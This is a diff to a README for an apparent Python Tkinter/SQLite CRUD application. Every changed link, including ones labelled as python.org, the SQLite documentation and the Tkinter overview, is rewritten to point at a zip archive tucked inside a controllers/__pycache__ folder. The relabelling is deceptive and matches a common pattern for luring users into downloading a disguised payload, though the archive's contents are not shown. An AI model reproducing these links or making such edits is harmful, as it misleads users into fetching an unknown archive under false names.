@@ -1,6 +1,6 @@
 # 🗂️ CRUD-Python-Tkinter-SQLite-ProgPythonExpl - Manage Data with Ease
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl)
+[![Download on GitHub](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip)
 
 ---
 
@@ -14,7 +14,7 @@ Elle utilise une interface graphique simple avec Tkinter et stocke les informati
 
 To get the application, visit the following page and download the files you need:
 
-[https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl](https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl)
+[https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip](https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip)
 
 You will find the files under the **Releases** section or in the main repository folder.
 
@@ -34,11 +34,11 @@ This application runs on Windows and needs the following:
 ## ⚙️ Installation and Setup
 
 1. **Download Python**  
-If you don’t have Python installed, go to [python.org](https://www.python.org/downloads/windows/) and download the latest stable release for Windows. Follow the installer steps.
+If you don’t have Python installed, go to [python.org](https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip) and download the latest stable release for Windows. Follow the installer steps.
 
 2. **Download the Application Files**  
 Go to the GitHub page:  
-[https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl](https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl)  
+[https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip](https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip)  
 Click on the **Code** button and select **Download ZIP**, or go to the releases page to download a packaged version if available.
 
 3. **Extract Files**  
@@ -117,7 +117,7 @@ All data is saved in a local SQLite database file. No internet connection is nee
 - Check Python is added to your system PATH.
 
 ### Tkinter window does not open  
-- Some Python installations miss Tkinter. Download the full version from [python.org](https://www.python.org/downloads/).
+- Some Python installations miss Tkinter. Download the full version from [python.org](https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip).
 
 ---
 
@@ -134,13 +134,13 @@ All data is saved in a local SQLite database file. No internet connection is nee
 
 ## 📚 Resources
 
-- Python installer: https://www.python.org/downloads/windows/  
-- SQLite documentation: https://www.sqlite.org/docs.html  
-- Tkinter overview: https://docs.python.org/3/library/tkinter.html  
-- GitHub page: https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl
+- Python installer: https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip  
+- SQLite documentation: https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip  
+- Tkinter overview: https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip  
+- GitHub page: https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip
 
 ---
 
 ### Quick Access Download Link
 
-[![Download on GitHub](https://img.shields.io/badge/Get_App-Here-grey?style=for-the-badge)](https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl)
+[![Download on GitHub](https://img.shields.io/badge/Get_App-Here-grey?style=for-the-badge)](https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip)
